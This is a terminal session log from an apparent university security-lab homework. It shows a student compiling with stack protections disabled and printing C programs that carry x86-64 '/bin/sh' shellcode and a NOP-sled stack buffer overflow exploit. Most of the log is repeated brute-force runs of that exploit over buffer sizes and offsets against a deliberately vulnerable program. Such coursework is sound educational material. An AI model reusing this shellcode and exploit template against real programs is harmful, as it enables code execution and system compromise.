@@ -1,0 +1,1404 @@
+Script started on Mon Mar  7 16:00:18 2016
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ gcc -z execstack -fno-stack-protector attack.c -o attack -g
+attack.c: In function 'main':
+attack.c:28:7: warning: incompatible implicit declaration of built-in function 'exit' [enabled by default]
+       exit(0);
+       ^
+attack.c:32:14: warning: incompatible implicit declaration of built-in function 'malloc' [enabled by default]
+       buff = malloc(bsize); 
+              ^
+attack.c:33:12: warning: assignment makes pointer from integer without a cast [enabled by default]
+       addr = get_sp() -offset;
+            ^
+attack.c:34:7: warning: format '%x' expects argument of type 'unsigned int', but argument 2 has type 'long long int *' [-Wformat=]
+       printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
+       ^
+attack.c:40:18: warning: assignment makes integer from pointer without a cast [enabled by default]
+       *(addr_ptr)=addr;
+                  ^
+attack.c:45:23: warning: assignment makes integer from pointer without a cast [enabled by default]
+       buff[bsize - 1] = (char*)NULL; 
+                       ^
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ gcc -z execstack -fno-stack-protector attack.c -o attack -g[C[1P[1P[1P[1P[1P[1P[1@v[1@u[1@l[3@n.c[C[C[C[1P[1P[C[C[C[C[C[C[C[C[C[C[1P -g[1P -g[1P -g[1P -g[1P -g[1P -gv -gu -gl -gn -g
+vuln.c: In function 'dumb':
+vuln.c:17:7: warning: assignment from incompatible pointer type [enabled by default]
+   hold=(int *)&test;
+       ^
+vuln.c:19:3: warning: format '%x' expects argument of type 'unsigned int', but argument 2 has type 'long long unsigned int' [-Wformat=]
+   printf("\n\nValue of Test:%x",(unsigned long long)&test);
+   ^
+vuln.c:20:3: warning: format '%x' expects argument of type 'unsigned int', but argument 2 has type 'long long unsigned int' [-Wformat=]
+   printf("\nValue of filename[0]:%x\n",(unsigned long long)filename);
+   ^
+vuln.c: In function 'main':
+vuln.c:36:7: warning: format '%d' expects argument of type 'int', but argument 2 has type 'size_t' [-Wformat=]
+       printf("\nLength of Input String:%d\n", strlen(string));
+       ^
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ cat part3b.c 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+unsigned long long *hold;
+int i;
+
+//Replace the below shell code with your shell code.
+//char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90"
+//"\x90\x90\x90\x90\x90\x90\x90\x90";
+char shellcode[] ="\xeb\x1b\x5f\x45\x31\xd2\x44\x89\xd2\x44\x89\xd6\x67\x41\x8d\x42\x3b\x0f\x05\x44\x89\xd7\x67\x41\x8d\x42\x3c\x0f\x05\xe8\xe0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+unsigned long long get_sp(void) { 
+  __asm__("movq %rsp,%rax"); 
+} 
+
+
+
+void dumb(char *arg)
+{
+  long long *test;
+  hold=(unsigned long long *)&test;
+  char filename[1024];   //Buffer to hold filename.
+  printf("\nValue of Test:%llx",(unsigned long long)&test);
+  printf("\nValue of filename[0]:%llx\n",(unsigned long long)filename);
+  printf("The attack buffer is going to need to be a little bit bigger than:%llx\n",((unsigned long long)test-(unsigned long long)filename));
+ 
+  strcpy (filename, shellcode);
+  
+  for (i=0;i<100;i++)
+   {
+     *hold=filename;
+     hold=hold+1;
+   }
+  
+  return;
+}
+
+
+int main(int argc, char* argv[])
+{
+  char holding[10000];        //This is just here as a buffer to try and keep you from overwriting main's return address, and into safe pages
+  char *string;
+  string=argv[1];             //string now points at the argument to main
+  unsigned long long stack; 
+  stack=get_sp();             //stack now points to the stack pointer.
+  
+    if(argc>1)                //Make sure that a filename was provided.
+    {
+      printf("\\Length of Input String:%d\\", strlen(string));
+      dumb(argv[1]);   
+    }
+    else
+      {
+	printf("\n\nError: No Command Line arg for vuln was given\n\n");
+	dumb("Useless Text");
+      }
+  return (0);
+}
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ cat part3b.c [K[K[K[K[K[K[K[K[Kattack.c 
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90"
+"\xeb\x1b\x5f\x45\x31\xd2\x44\x89"
+"\xd2\x44\x89\xd6\x67\x41\x8d\x42"
+"\x3b\x0f\x05\x44\x89\xd7\x67\x41"
+"\x8d\x42\x3c\x0f\x05\xe8\xe0\xff"
+"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+//Replace the above NOP buffer with your shell code.
+
+unsigned long get_sp(void) { 
+  __asm__("movq %rsp,%rax"); 
+} 
+
+void main(int argc, char *argv[]) 
+{ 
+  int bsize=0, offset=0,i=0,j=0;
+  char *buff, *ptr;
+  long long *addr,*addr_ptr;
+  if (argc == 1)
+    {
+      printf("\n\nUsage is either attack [buffer_size]\n or attack [buffer_size] [stack_offset]\n");
+      exit(0);
+    }
+  if (argc > 1) bsize = atoi(argv[1]); 
+  if (argc > 2) offset = atoi(argv[2]); 
+      buff = malloc(bsize); 
+      addr = get_sp() -offset;
+      printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
+      ptr = buff; 
+      addr_ptr = (long long *) ptr; 
+      
+      for (i = 0; i < bsize-8; i+=8) 
+	*(addr_ptr++) = 0xFFFFFFFFFFFFFFFF; 
+      *(addr_ptr)=addr;
+
+      for (i = 0; i < strlen(shellcode); i++) 
+	*(ptr++) = shellcode[i]; 
+      
+      buff[bsize - 1] = (char*)NULL; 
+      
+      execl("./vuln","./vuln", buff, NULL);
+      return;
+}
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 10[K[K1056
+
+Using address as guess for beginning of attack buffer: 0xffffe520
+
+Length of Input String:1054
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Illegal instruction (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1056 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1054
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Illegal instruction (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1056 12016[1P 12016[1P 120163 120162 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1030
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1032 12016[1P 120163 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1032
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1033 12016[C[1P 120164 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1033
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1034 120163[C[C[C[C[C[C2[C[C[C[C[C[C56[C[C[C[C[C[C[K 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1054
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Illegal instruction (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1056 12016[K[K32
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1054
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Illegal instruction (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1056 12032[K[K00
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1054
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1056 12000[1P 12000[1P 120003 120002 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1030
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1032 12000[K[K16
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1030
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1032 12016[K[K[K[K1984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1030
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1032 11984[1P 119843 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1032
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1033 11984[1P 119844 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1033
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1034 11984[1P 119845 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1034
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1035 11984[C[1P 119846 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1035
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1036 11984[1P 119848 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1037
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1038 11984[1P 119849 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1038
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1039 11984[1P 11984[1P 119844 119840 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1038
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1040 11984[1P 119841 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1040
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+Illegal instruction (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1041 11984[Kgdb .at[K[K/attack 
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./attack...done.
+(gdb) run 1041 11984
+Starting program: /home/seclab/HWA2/submitted/attack 1041 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb5e0
+process 3983 is executing new program: /home/seclab/HWA2/submitted/vuln
+
+Length of Input String:1040
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7ff74c0 in ?? ()
+(gdb) bt
+#0  0x00007ffff7ff74c0 in ?? ()
+#1  0x00007ffff7ffe1c8 in _r_debug ()
+#2  0x0000000000000000 in ?? ()
+(gdb) btrun 1041 11984    2032
+The program being debugged has been started already.
+Start it from the beginning? (y or n) n
+Program not restarted.
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 3983] will be killed.
+
+Quit anyway? (y or n) y
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ gdb ./attack 
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./attack...done.
+(gdb) run 1041 199  2032
+Starting program: /home/seclab/HWA2/submitted/attack 1041 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb5b0
+process 3989 is executing new program: /home/seclab/HWA2/submitted/vuln
+
+Length of Input String:1040
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7ff74c0 in ?? ()
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 3989] will be killed.
+
+Quit anyway? (y or n) y
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ gdb ./attack 
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./attack...done.
+(gdb) run 1041 11936
+Starting program: /home/seclab/HWA2/submitted/attack 1041 11936
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+process 3995 is executing new program: /home/seclab/HWA2/submitted/vuln
+
+Length of Input String:1040
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7ff74c0 in ?? ()
+(gdb) bt
+#0  0x00007ffff7ff74c0 in ?? ()
+#1  0x00007ffff7ffe1c8 in _r_debug ()
+#2  0x0000000000000000 in ?? ()
+(gdb) bt[Kquit
+A debugging session is active.
+
+	Inferior 1 [process 3995] will be killed.
+
+Quit anyway? (y or n) y
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ gdb ./attack ./attack 1041 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1040
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+Illegal instruction (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1041 11984[C[1P 119842 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1041
+
+
+Value of Test:ffffba48
+Value of filename[0]:ffffb640
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1042 11984[C[1P 119843 11984
+
+Using address as guess for beginning of attack buffer: 0xffffb640
+
+Length of Input String:1042
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1043 11984[C[C[C[C[C[K[K[K[K2000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1042
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1043 12000[1P 120004 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1043
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1044 12000[1P 120005 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1044
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1045 12000[1P 120006 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1045
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1046 12000[C[1P 120007 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1046
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1047 12000[1P 120008 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1046
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1048 12000[1P 120009 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1048
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1049 12000[1P 12000[1P 120005 120000 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1049
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1050 12000[1P 120001 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1050
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1051 12000[1P 120002 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1051
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1052 12000[C[C[1P 120003 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1052
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1053 12000[1P 120004 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1053
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1054 12000[1P 120005 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1054
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1055 12000[1P 120006 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1054
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1056 12000[1P 120007 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1056
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1057 12000[1P 120008 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1057
+
+
+Value of Test:ffffba38
+Value of filename[0]:ffffb630
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ls .
+./  ../ 
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ls .
+./  ../ 
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ls .[K[K[K[K./attack 1058 12000[1P 120009 12000
+
+Using address as guess for beginning of attack buffer: 0xffffb630
+
+Length of Input String:1058
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1059 12000[C[C[C[C[C[K[K16
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1058
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1059 12016[1P 12016[1P 120166 120160 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1059
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1060 12016[1P 120161 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1060
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1061 12016[1P[1@6[C[1P 120162 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1061
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1062 12016[1P 120163 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1062
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1063 12016[C[1P 120164 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1062
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1064 12016[1P 120165 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1064
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1065 12016[1P 120166 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1065
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1066 12016[1P 120167 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1066
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1067 12016[1P 120168 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1067
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1068 12016[1P 120169 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1068
+
+
